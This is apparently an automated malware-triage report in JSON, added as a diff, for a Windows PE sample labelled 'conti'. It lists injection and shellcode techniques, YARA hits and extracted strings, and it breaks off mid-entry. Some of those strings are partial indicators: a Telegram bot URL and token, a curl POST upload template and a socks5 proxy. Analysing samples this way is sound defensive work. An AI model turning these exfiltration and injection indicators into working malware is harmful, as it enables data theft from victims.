@@ -1,0 +1,3480 @@
+{
+  "capa": {
+    "rule_count": 17,
+    "top_rules": [
+      {
+        "name": "encrypt data using RC4 PRGA",
+        "attack": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Obfuscated Files or Information"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Obfuscated Files or Information",
+            "subtechnique": "",
+            "id": "T1027"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Cryptography",
+              "Encrypt Data",
+              "RC4"
+            ],
+            "objective": "Cryptography",
+            "behavior": "Encrypt Data",
+            "method": "RC4",
+            "id": "C0027.009"
+          },
+          {
+            "parts": [
+              "Cryptography",
+              "Generate Pseudo-random Sequence",
+              "RC4 PRGA"
+            ],
+            "objective": "Cryptography",
+            "behavior": "Generate Pseudo-random Sequence",
+            "method": "RC4 PRGA",
+            "id": "C0021.004"
+          }
+        ]
+      },
+      {
+        "name": "get common file path",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "File and Directory Discovery",
+            "subtechnique": "",
+            "id": "T1083"
+          }
+        ],
+        "mbc": [
+          {
+            "parts": [
+              "Discovery",
+              "File and Directory Discovery"
+            ],
+            "objective": "Discovery",
+            "behavior": "File and Directory Discovery",
+            "method": "",
+            "id": "E1083"
+          }
+        ]
+      },
+      {
+        "name": "inject thread",
+        "attack": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Process Injection",
+              "Thread Execution Hijacking"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Process Injection",
+            "subtechnique": "Thread Execution Hijacking",
+            "id": "T1055.003"
+          },
+          {
+            "parts": [
+              "Defense Evasion",
+              "Reflective Code Loading"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Reflective Code Loading",
+            "subtechnique": "",
+            "id": "T1620"
+          }
+        ],
+        "mbc": []
+      },
+      {
+        "name": "enumerate processes",
+        "attack": [
+          {
+            "parts": [
+              "Discovery",
+              "Process Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "Process Discovery",
+            "subtechnique": "",
+            "id": "T1057"
+          },
+          {
+            "parts": [
+              "Discovery",
+              "Software Discovery"
+            ],
+            "tactic": "Discovery",
+            "technique": "Software Discovery",
+            "subtechnique": "",
+            "id": "T1518"
+          }
+        ],
+        "mbc": []
+      },
+      {
+        "name": "contain an embedded PE file",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "Execution",
+              "Install Additional Program"
+            ],
+            "objective": "Execution",
+            "behavior": "Install Additional Program",
+            "method": "",
+            "id": "B0023"
+          }
+        ]
+      },
+      {
+        "name": "delete file",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "File System",
+              "Delete File"
+            ],
+            "objective": "File System",
+            "behavior": "Delete File",
+            "method": "",
+            "id": "C0047"
+          }
+        ]
+      },
+      {
+        "name": "write file on Windows",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "File System",
+              "Writes File"
+            ],
+            "objective": "File System",
+            "behavior": "Writes File",
+            "method": "",
+            "id": "C0052"
+          }
+        ]
+      },
+      {
+        "name": "allocate or change RWX memory",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "Memory",
+              "Allocate Memory"
+            ],
+            "objective": "Memory",
+            "behavior": "Allocate Memory",
+            "method": "",
+            "id": "C0007"
+          }
+        ]
+      },
+      {
+        "name": "inject dll",
+        "attack": [
+          {
+            "parts": [
+              "Defense Evasion",
+              "Process Injection",
+              "Dynamic-link Library Injection"
+            ],
+            "tactic": "Defense Evasion",
+            "technique": "Process Injection",
+            "subtechnique": "Dynamic-link Library Injection",
+            "id": "T1055.001"
+          }
+        ],
+        "mbc": []
+      },
+      {
+        "name": "terminate process",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "Process",
+              "Terminate Process"
+            ],
+            "objective": "Process",
+            "behavior": "Terminate Process",
+            "method": "",
+            "id": "C0018"
+          }
+        ]
+      },
+      {
+        "name": "create thread",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "Process",
+              "Create Thread"
+            ],
+            "objective": "Process",
+            "behavior": "Create Thread",
+            "method": "",
+            "id": "C0038"
+          }
+        ]
+      },
+      {
+        "name": "link function at runtime on Windows",
+        "attack": [
+          {
+            "parts": [
+              "Execution",
+              "Shared Modules"
+            ],
+            "tactic": "Execution",
+            "technique": "Shared Modules",
+            "subtechnique": "",
+            "id": "T1129"
+          }
+        ],
+        "mbc": []
+      },
+      {
+        "name": "enumerate PE sections",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "Discovery",
+              "Code Discovery",
+              "Enumerate PE Sections"
+            ],
+            "objective": "Discovery",
+            "behavior": "Code Discovery",
+            "method": "Enumerate PE Sections",
+            "id": "B0046.001"
+          }
+        ]
+      },
+      {
+        "name": "parse PE header",
+        "attack": [
+          {
+            "parts": [
+              "Execution",
+              "Shared Modules"
+            ],
+            "tactic": "Execution",
+            "technique": "Shared Modules",
+            "subtechnique": "",
+            "id": "T1129"
+          }
+        ],
+        "mbc": []
+      },
+      {
+        "name": "execute shellcode via indirect call",
+        "attack": [],
+        "mbc": [
+          {
+            "parts": [
+              "Memory",
+              "Allocate Memory"
+            ],
+            "objective": "Memory",
+            "behavior": "Allocate Memory",
+            "method": "",
+            "id": "C0007"
+          }
+        ]
+      }
+    ],
+    "timeout_s": 300,
+    "sample_size": 593885,
+    "duration_s": 1.98,
+    "engine": "malcat-capa",
+    "capa_bin": "/opt/malcat/bin/malcat.capa.py"
+  },
+  "pe_imports": {
+    "engine": "pe_imports",
+    "sample_size": 593885,
+    "duration_s": 0.01,
+    "import_count": 66,
+    "signal_count": 5,
+    "signals": [
+      {
+        "label": "allocate_memory",
+        "api_match": "VirtualAllocEx",
+        "attack": [
+          "T1055"
+        ]
+      },
+      {
+        "label": "write_process_memory",
+        "api_match": "WriteProcessMemory",
+        "attack": [
+          "T1055"
+        ]
+      },
+      {
+        "label": "create_remote_thread",
+        "api_match": "CreateRemoteThread",
+        "attack": [
+          "T1055"
+        ]
+      },
+      {
+        "label": "get_proc_address",
+        "api_match": "GetProcAddress",
+        "attack": [
+          "T1129"
+        ]
+      },
+      {
+        "label": "change_memory_protection",
+        "api_match": "VirtualProtect",
+        "attack": [
+          "T1055"
+        ]
+      }
+    ],
+    "hint": "PE import high-signal map (pefile). Not capa."
+  },
+  "yara": {
+    "rule_count": 12,
+    "matches": [
+      {
+        "rule": "domain",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": [
+          {
+            "id": "$domain_regex",
+            "offset": 0,
+            "length": 2,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "spyeye",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": [
+          {
+            "id": "$f",
+            "offset": 452832,
+            "length": 8,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "IP",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": [
+          {
+            "id": "$ipv4",
+            "offset": 124590,
+            "length": 28,
+            "xor_key": null
+          },
+          {
+            "id": "$ipv6",
+            "offset": 124914,
+            "length": 6,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "contains_base64",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": [
+          {
+            "id": "$a",
+            "offset": 1600,
+            "length": 12,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "url",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": [
+          {
+            "id": "$url_regex",
+            "offset": 124032,
+            "length": 56,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "IsPE64",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": []
+      },
+      {
+        "rule": "IsWindowsGUI",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": []
+      },
+      {
+        "rule": "HasOverlay",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": []
+      },
+      {
+        "rule": "SEH__v4",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": [
+          {
+            "id": "$",
+            "offset": 592021,
+            "length": 12,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "inject_thread",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": [
+          {
+            "id": "$c1",
+            "offset": 465120,
+            "length": 11,
+            "xor_key": null
+          },
+          {
+            "id": "$c2",
+            "offset": 465220,
+            "length": 14,
+            "xor_key": null
+          },
+          {
+            "id": "$c4",
+            "offset": 465322,
+            "length": 18,
+            "xor_key": null
+          },
+          {
+            "id": "$c5",
+            "offset": 464790,
+            "length": 18,
+            "xor_key": null
+          },
+          {
+            "id": "$c6",
+            "offset": 150610,
+            "length": 12,
+            "xor_key": null
+          },
+          {
+            "id": "$c7",
+            "offset": 465120,
+            "length": 11,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "screenshot",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": [
+          {
+            "id": "$d1",
+            "offset": 152012,
+            "length": 9,
+            "xor_key": null
+          },
+          {
+            "id": "$d2",
+            "offset": 152784,
+            "length": 10,
+            "xor_key": null
+          },
+          {
+            "id": "$c1",
+            "offset": 150226,
+            "length": 6,
+            "xor_key": null
+          },
+          {
+            "id": "$c2",
+            "offset": 151934,
+            "length": 5,
+            "xor_key": null
+          }
+        ]
+      },
+      {
+        "rule": "win_mutex",
+        "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+        "strings": [
+          {
+            "id": "$c1",
+            "offset": 150576,
+            "length": 11,
+            "xor_key": null
+          }
+        ]
+      }
+    ],
+    "engine": "yara-x",
+    "rules_compiled": 454,
+    "compile_errors": [
+      "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
+      "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_pornClicker.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_pornClicker.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_Spywaller.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Spywaller.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_OmniRat.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_OmniRat.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Wshell_ChineseSpam.yar: error[E014]: invalid regular expression\n  --> /opt/samples/rules/flat/Wshell_ChineseSpam.yar:17:42\n   |\n17 |         $c = /if ?\\(\\$_POST\\[Submit\\]\\) ?{/\n   |                                          ^ unclosed counted repetition\n   |\n   = note: did you mean `\\{` instead of `{`?",
+      "/opt/samples/rules/flat/Android_FakeBank_Fanta.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_FakeBank_Fanta.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+      "/opt/samples/rules/flat/Android_AliPay_smsStealer.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_AliPay_smsStealer.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found"
+    ],
+    "incomplete": true,
+    "duration_s": 3.81
+  },
+  "floss": {
+    "floss_ok": true,
+    "string_count": 7006,
+    "strings_sampled": 80,
+    "strings": [
+      "!This program cannot be run in DOS mode.",
+      "`.data",
+      ".rdata",
+      "@.pdata",
+      "@.xdata",
+      ".idata",
+      "@.reloc",
+      "=CCG u",
+      "AWAVAUATUWVSH",
+      "X[^_]A\\A]A^A_",
+      "8MZuJHcP<H",
+      "AVWVSH",
+      "UAVAUATWVSH",
+      "[^_A\\A]A^]",
+      "([^_]H",
+      "@' t\tH",
+      ".edata",
+      "@.idata",
+      ".reloc",
+      "AVATUWVS",
+      "TestpassI",
+      "[^_]A\\A^A_",
+      "h;\\$Xs#I",
+      "J(A;J,}4Hc",
+      "I(D;I,}FIc",
+      "<_t`<ntT",
+      "R(A;R,}-Hc",
+      "ATUWVSH",
+      "P[^_]A\\",
+      "_GLOBAL_H9",
+      "BHA;R,}VHc",
+      "C8;C<|",
+      "X[^_A^",
+      "0[^_]A\\",
+      "R(A;R,}",
+      "AVUWVSH",
+      "P[^_]A^",
+      "U(;U,}:Hc",
+      "<Et6<Qt2H",
+      "D$0<Qt@H",
+      "<st\\<f",
+      "AVAUATUWVSH",
+      "0[^_]A\\A]A^",
+      "C8;C<}ZH",
+      "C(;C,}3Lc",
+      "C(;C,L",
+      "D$ }hLc",
+      "AWAVATUWVSH",
+      "`[^_]A\\",
+      "UAWAVAUATWVSH",
+      "0<\tw5A",
+      "[^_A\\A]A^A_]",
+      "H[^_A^",
+      "~D$8fH",
+      "@$A9@(~",
+      "C$9C(~",
+      "@[^_]A\\",
+      "S$9S(~",
+      "UAVWVSH",
+      "[^_A^]",
+      "=UUUUw",
+      "[^_]A\\A]A^A_",
+      "IcP$fA",
+      "HcC$fA",
+      "LcC$fB",
+      "HcS$fA",
+      "8[^_]A\\A]A^A_",
+      "D$L)D$X",
+      "L$8HcD$L;A",
+      "D$X+D$`",
+      "ATUWVSLcY",
+      "[^_]A\\",
+      "[^_]A\\A]A^",
+      "AUATUWVSH",
+      "([^_]A\\A]",
+      "WVSHcA",
+      "H[^_]H",
+      "H[^_]A\\A]",
+      "H[^_]A\\A]H",
+      "([^_A^H"
+    ],
+    "per_category": {
+      "decoded_strings": 0,
+      "stack_strings": 0,
+      "tight_strings": 0,
+      "language_strings": 0,
+      "language_strings_missed": 0,
+      "static_strings": 7006
+    },
+    "raw_key_total": 3,
+    "floss_profile": "full",
+    "floss_language": "none",
+    "duration_s": 10.15,
+    "size_bytes": 593885,
+    "static_only": false,
+    "size_exceeded_deobfuscate_limit": false
+  },
+  "malcat": {
+    "analysis_id": 1,
+    "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+    "profile": "deep",
+    "limits": {
+      "strings_max": 300,
+      "imports_max": 300,
+      "functions_max": 30,
+      "anomaly_locations_max": 50,
+      "decompile_top_n": 3
+    },
+    "file_summary": {
+      "analysis_id": 1,
+      "file_name": "2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+      "file_path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
+      "file_size": 593885,
+      "type": "PE",
+      "architecture": "X64",
+      "entropy": 98,
+      "sha256": "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
+      "metadata": {},
+      "entrypoint_ea": 2624,
+      "layout": [
+        {
+          "name": "header",
+          "effective_address": 0,
+          "physical_size": 1536,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 70
+        },
+        {
+          "name": ".text",
+          "effective_address": 1536,
+          "physical_size": 7680,
+          "virtual_size": 8192,
+          "rights": "RX",
+          "entropy": 119
+        },
+        {
+          "name": ".data",
+          "effective_address": 9728,
+          "physical_size": 449024,
+          "virtual_size": 450560,
+          "rights": "RW",
+          "entropy": 98
+        },
+        {
+          "name": ".rdata",
+          "effective_address": 460288,
+          "physical_size": 3584,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 81
+        },
+        {
+          "name": ".pdata",
+          "effective_address": 464384,
+          "physical_size": 1024,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 103
+        },
+        {
+          "name": ".xdata",
+          "effective_address": 468480,
+          "physical_size": 512,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 50
+        },
+        {
+          "name": ".idata",
+          "effective_address": 472576,
+          "physical_size": 3072,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 50
+        },
+        {
+          "name": ".tls",
+          "effective_address": 476672,
+          "physical_size": 512,
+          "virtual_size": 4096,
+          "rights": "RW",
+          "entropy": 0
+        },
+        {
+          "name": ".rsrc",
+          "effective_address": 480768,
+          "physical_size": 1536,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 0
+        },
+        {
+          "name": ".reloc",
+          "effective_address": 484864,
+          "physical_size": 512,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 52
+        },
+        {
+          "name": "/4",
+          "effective_address": 488960,
+          "physical_size": 1536,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 0
+        },
+        {
+          "name": "/19",
+          "effective_address": 493056,
+          "physical_size": 46080,
+          "virtual_size": 49152,
+          "rights": "R",
+          "entropy": 97
+        },
+        {
+          "name": "/31",
+          "effective_address": 542208,
+          "physical_size": 9216,
+          "virtual_size": 12288,
+          "rights": "R",
+          "entropy": 111
+        },
+        {
+          "name": "/45",
+          "effective_address": 554496,
+          "physical_size": 8192,
+          "virtual_size": 8192,
+          "rights": "R",
+          "entropy": 116
+        },
+        {
+          "name": "/57",
+          "effective_address": 562688,
+          "physical_size": 2560,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 106
+        },
+        {
+          "name": "/70",
+          "effective_address": 566784,
+          "physical_size": 1024,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 102
+        },
+        {
+          "name": "/81",
+          "effective_address": 570880,
+          "physical_size": 7168,
+          "virtual_size": 8192,
+          "rights": "R",
+          "entropy": 94
+        },
+        {
+          "name": "/97",
+          "effective_address": 579072,
+          "physical_size": 5120,
+          "virtual_size": 8192,
+          "rights": "R",
+          "entropy": 100
+        },
+        {
+          "name": "/113",
+          "effective_address": 587264,
+          "physical_size": 512,
+          "virtual_size": 4096,
+          "rights": "R",
+          "entropy": 80
+        },
+        {
+          "name": "overlay",
+          "effective_address": 591360,
+          "physical_size": 43485,
+          "virtual_size": 0,
+          "rights": "",
+          "entropy": 83
+        },
+        {
+          "name": ".bss",
+          "effective_address": 634845,
+          "physical_size": 0,
+          "virtual_size": 4096,
+          "rights": "RW",
+          "entropy": 0
+        }
+      ],
+      "kesakode_verdict": []
+    },
+    "views": {
+      "anomalies": [
+        {
+          "name": "BssNonEmpty",
+          "desc": "Bss Region/section is not empty",
+          "category": "entropy",
+          "level": 3,
+          "num_hits": 1
+        },
+        {
+          "name": "EmbeddedProgram",
+          "desc": "File embeds a program",
+          "category": "embedding",
+          "level": 3,
+          "num_hits": 1
+        },
+        {
+          "name": "GuiSubsystemNoWindowApi",
+          "desc": "A GUI windows application does not import any user32 window-related function",
+          "category": "headers",
+          "level": 2,
+          "num_hits": 1
+        },
+        {
+          "name": "InvalidSizeOfInitializedData",
+          "desc": "SizeOfInitializedData is not the sum of all ininitalized data sections (raw or virtual)",
+          "category": "sections",
+          "level": 2,
+          "num_hits": 1
+        },
+        {
+          "name": "XorInLoop",
+          "desc": "XOR instruction in a loop",
+          "category": "code",
+          "level": 3,
+          "num_hits": 1
+        }
+      ],
+      "anomaly_locations": {
+        "GuiSubsystemNoWindowApi": [
+          {
+            "ea": 220,
+            "context": ""
+          }
+        ],
+        "XorInLoop": [
+          {
+            "ea": 8765,
+            "context": ""
+          }
+        ]
+      },
+      "yara_hits": [
+        {
+          "id": "EnumerateProcesses",
+          "category": "fingerprint",
+          "reliability": 60,
+          "type": "UNCOMMON",
+          "description": "Enumerate running processes, a technique sometimes used by packers to avoid specific security products or detect sandbox environments",
+          "num_patterns": 2
+        }
+      ],
+      "strings": [
+        {
+          "ea": 460296,
+          "summary": "%s\\dl%lu.dll"
+        },
+        {
+          "ea": 480856,
+          "summary": "<?xml version=\"1..ty>\n</assembly>\n"
+        },
+        {
+          "ea": 460322,
+          "summary": "explorer.exe"
+        },
+        {
+          "ea": 634054,
+          "summary": "__imp_CreateToolhelp32Snapshot"
+        },
+        {
+          "ea": 460335,
+          "summary": "kernel32.dll"
+        },
+        {
+          "ea": 474028,
+          "summary": "CreateToolhelp32Snapshot"
+        },
+        {
+          "ea": 630198,
+          "summary": "CreateToolhelp32Snapshot"
+        },
+        {
+          "ea": 461064,
+          "summary": "%d bit pseudo re..g the value %p.\n"
+        },
+        {
+          "ea": 630413,
+          "summary": "__imp_Process32Next"
+        },
+        {
+          "ea": 460960,
+          "summary": "  Unknown pseudo..col version %d.\n"
+        },
+        {
+          "ea": 460864,
+          "summary": "  VirtualQuery f..es at address %p"
+        },
+        {
+          "ea": 474368,
+          "summary": "Process32Next"
+        },
+        {
+          "ea": 634299,
+          "summary": "Process32Next"
+        },
+        {
+          "ea": 475232,
+          "summary": "api-ms-win-crt-e..nment-l1-1-0.dll"
+        },
+        {
+          "ea": 460656,
+          "summary": "The result is to..nted (UNDERFLOW)"
+        },
+        {
+          "ea": 475612,
+          "summary": "api-ms-win-crt-string-l1-1-0.dll"
+        },
+        {
+          "ea": 475496,
+          "summary": "api-ms-win-crt-r..ntime-l1-1-0.dll"
+        },
+        {
+          "ea": 475400,
+          "summary": "api-ms-win-crt-p..ivate-l1-1-0.dll"
+        },
+        {
+          "ea": 475560,
+          "summary": "api-ms-win-crt-stdio-l1-1-0.dll"
+        },
+        {
+          "ea": 475324,
+          "summary": "api-ms-win-crt-locale-l1-1-0.dll"
+        },
+        {
+          "ea": 460920,
+          "summary": "  VirtualProtect..d with code 0x%x"
+        },
+        {
+          "ea": 460480,
+          "summary": "Argument domain error (DOMAIN)"
+        },
+        {
+          "ea": 475364,
+          "summary": "api-ms-win-crt-math-l1-1-0.dll"
+        },
+        {
+          "ea": 460616,
+          "summary": "Total loss of si..ificance (TLOSS)"
+        },
+        {
+          "ea": 460348,
+          "summary": "LoadLibraryW"
+        },
+        {
+          "ea": 461016,
+          "summary": "  Unknown pseudo..on bit size %d.\n"
+        },
+        {
+          "ea": 475288,
+          "summary": "api-ms-win-crt-heap-l1-1-0.dll"
+        },
+        {
+          "ea": 460511,
+          "summary": "Argument singularity (SIGN)"
+        },
+        {
+          "ea": 460832,
+          "summary": "Address %p has no image-section"
+        },
+        {
+          "ea": 460800,
+          "summary": "Mingw-w64 runtime failure:\n"
+        },
+        {
+          "ea": 460710,
+          "summary": "Unknown error"
+        },
+        {
+          "ea": 460728,
+          "summary": "_matherr(): %s i..g)  (retval=%g)\n"
+        },
+        {
+          "ea": 461152,
+          "summary": "runtime error %d\n"
+        },
+        {
+          "ea": 475212,
+          "summary": "KERNEL32.dll"
+        },
+        {
+          "ea": 460576,
+          "summary": "Partial loss of ..ificance (PLOSS)"
+        },
+        {
+          "ea": 124544,
+          "summary": "https://api.telegram.org/bot"
+        },
+        {
+          "ea": 124736,
+          "summary": "\"%s\" -X POST --s..ctet-stream \"%s\""
+        },
+        {
+          "ea": 436940,
+          "summary": ".pdata$_ZNK10__c.._dyncast_resultE"
+        },
+        {
+          "ea": 436805,
+          "summary": ".xdata$_ZNK10__c.._dyncast_resultE"
+        },
+        {
+          "ea": 436671,
+          "summary": ".text$_ZNK10__cx.._dyncast_resultE"
+        },
+        {
+          "ea": 435749,
+          "summary": "_ZNK10__cxxabiv1.._dyncast_resultE"
+        },
+        {
+          "ea": 460544,
+          "summary": "Overflow range error (OVERFLOW)"
+        },
+        {
+          "ea": 430529,
+          "summary": ".xdata$_ZNK10__c.._dyncast_resultE"
+        },
+        {
+          "ea": 430643,
+          "summary": ".pdata$_ZNK10__c.._dyncast_resultE"
+        },
+        {
+          "ea": 430416,
+          "summary": ".text$_ZNK10__cx.._dyncast_resultE"
+        },
+        {
+          "ea": 437185,
+          "summary": ".xdata$_ZNK10__c..__upcast_resultE"
+        },
+        {
+          "ea": 437075,
+          "summary": ".text$_ZNK10__cx..__upcast_resultE"
+        },
+        {
+          "ea": 437296,
+          "summary": ".pdata$_ZNK10__c..__upcast_resultE"
+        },
+        {
+          "ea": 125056,
+          "summary": "socks5://oWWV0o:...122.192.59:8000"
+        },
+        {
+          "ea": 429425,
+          "summary": "_ZNK10__cxxabiv1.._dyncast_resultE"
+        },
+        {
+          "ea": 436570,
+          "summary": ".pdata$_ZNK10__c..ss_type_infoES2_"
+        },
+        {
+          "ea": 435877,
+          "summary": "_ZNK10__cxxabiv1..__upcast_resultE"
+        },
+        {
+          "ea": 124448,
+          "summary": "C:\\Windows\\System32\\curl.exe"
+        },
+        {
+          "ea": 436469,
+          "summary": ".xdata$_ZNK10__c..ss_type_infoES2_"
+        },
+        {
+          "ea": 433085,
+          "summary": ".text$_ZN10__cxx..5_Unwind_Context"
+        },
+        {
+          "ea": 152824,
+          "summary": "api-ms-win-crt-e..nment-l1-1-0.dll"
+        },
+        {
+          "ea": 436369,
+          "summary": ".text$_ZNK10__cx..ss_type_infoES2_"
+        },
+        {
+          "ea": 433173,
+          "summary": ".xdata$_ZN10__cx..5_Unwind_Context"
+        },
+        {
+          "ea": 433262,
+          "summary": ".pdata$_ZN10__cx..5_Unwind_Context"
+        },
+        {
+          "ea": 430844,
+          "summary": ".xdata$_ZNK10__c..__upcast_resultE"
+        },
+        {
+          "ea": 430932,
+          "summary": ".pdata$_ZNK10__c..__upcast_resultE"
+        },
+        {
+          "ea": 431733,
+          "summary": "_ZN10__cxxabiv1L..5_Unwind_Context"
+        },
+        {
+          "ea": 435655,
+          "summary": "_ZNK10__cxxabiv1..ss_type_infoES2_"
+        },
+        {
+          "ea": 430757,
+          "summary": ".text$_ZNK10__cx..__upcast_resultE"
+        },
+        {
+          "ea": 153184,
+          "summary": "api-ms-win-crt-string-l1-1-0.dll"
+        },
+        {
+          "ea": 152968,
+          "summary": "api-ms-win-crt-p..ivate-l1-1-0.dll"
+        },
+        {
+          "ea": 153224,
+          "summary": "api-ms-win-crt-u..ility-l1-1-0.dll"
+        },
+        {
+          "ea": 124608,
+          "summary": "8602432148:AAGpo..DQ7S3TlggkEMOVQE"
+        },
+        {
+          "ea": 429532,
+          "summary": "_ZNK10__cxxabiv1..__upcast_resultE"
+        },
+        {
+          "ea": 153040,
+          "summary": "api-ms-win-crt-r..ntime-l1-1-0.dll"
+        },
+        {
+          "ea": 152916,
+          "summary": "api-ms-win-crt-locale-l1-1-0.dll"
+        },
+        {
+          "ea": 434981,
+          "summary": ".pdata$_ZL23__gx..Unwind_Exception"
+        },
+        {
+          "ea": 429986,
+          "summary": ".xdata$_ZNK10__c..srcExPKvPKS0_S2_"
+        },
+        {
+          "ea": 434904,
+          "summary": ".xdata$_ZL23__gx..Unwind_Exception"
+        },
+        {
+          "ea": 430064,
+          "summary": ".pdata$_ZNK10__c..srcExPKvPKS0_S2_"
+        },
+        {
+          "ea": 152784,
+          "summary": "api-ms-win-crt-c..nvert-l1-1-0.dll"
+        },
+        {
+          "ea": 153112,
+          "summary": "api-ms-win-crt-stdio-l1-1-0.dll"
+        },
+        {
+          "ea": 438079,
+          "summary": ".pdata$_ZNKSt9ty..ss_type_infoEPPv"
+        },
+        {
+          "ea": 186060,
+          "summary": "\nGNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 189875,
